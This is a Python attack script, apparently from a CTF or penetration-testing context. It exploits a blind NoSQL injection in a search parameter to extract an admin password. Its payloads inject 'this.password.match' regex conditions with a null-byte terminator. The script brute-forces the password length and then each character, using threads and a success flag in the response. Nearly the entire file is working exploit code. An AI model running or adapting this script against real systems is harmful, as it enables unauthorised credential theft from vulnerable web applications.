#!/usr/bin/env python

import requests
import string
from os import system
import threading
import sys

def print_there(x, y, text):		# Print at x,y coordinate in terminal
     sys.stdout.write("\x1b7\x1b[%d;%df%s\x1b8" % (x, y, text))
     sys.stdout.flush()

url = "http://abc.com/?search="
field = "password"
flag = ">admin<"	# response flag used to check success results
password = ""
req_per_sec=10
pass_max_len=50
pass_orig_len=0
# resp = requests.request(method='GET', url=url+requests.utils.quote(payload)+"%00")
# ^user inputs payload (which is url-encoded).. null character is not encoded and added later on to comment

def check_len(i):
	global pass_orig_len
	resp = requests.request(method='GET', url=url+"admin%27%20%26%26%20this."+field+".match(/^{}$/)%00".format(i*'.'))
	if flag in resp.text:
		print_there(1,1,"Password is of length {}".format(i))
		pass_orig_len=i

def check(str):
	global password
	resp = requests.request(method='GET', url=url+"admin%27%20%26%26%20this."+field+".match(/^{}/)%00".format(password+str))
	if flag in resp.text:
		password+=str
		print_there(3,1,'Password: {}'.format(password))
	else:
		print_there(4,1,"Failed attempt: {}".format(password+str))

numbers = [str(i) for i in range(10)]
symbols = ['~', ':', "'", '+', '[', '\\', '@', '{', '%', '(', '-', '"', ',', '&', '<', '`', '}', '_', '=', ']', '!', '>', ';', '#', '$', ')', '/']
# removed (.,^,?,*,|)  (messes regex, and me lazy)
charset = list(string.ascii_lowercase) + list(string.ascii_uppercase) + numbers + symbols

def get_pass_len():
	for i in range(pass_max_len):
		running_threads=0
		t1 = threading.Thread(target=check_len, args=(i,))
		t1.start()
		running_threads+=1
		if running_threads%req_per_sec == 0:
			t1.join()

def get_pass():
	for i in range(pass_orig_len+1-len(password)):
		running_threads=0
		for i in charset:
			t2 = threading.Thread(target=check, args=(i,))
			t2.start()
			running_threads+=1
			if running_threads%req_per_sec == 0:		# 10 req/s only
				t2.join()					# wait for threads to finish and join them

def confirm_pass():
	resp = requests.request(method='GET', url=url+"admin%27%20%26%26%20this."+field+".match(/^{}$/)%00".format(password))
	if flag in resp.text:
		print_there(6,1,'Password confirmed: {}'.format(password))
	else:
		print_there(6,1,'Password {} still not matched!'.format(password))

if __name__ == '__main__':

	system('clear')
	get_pass_len()

	while pass_orig_len == 0:	# If length of password isn't calculated, thread doesn't go to get_pass
		system('sleep 3')

	get_pass()
	confirm_pass()
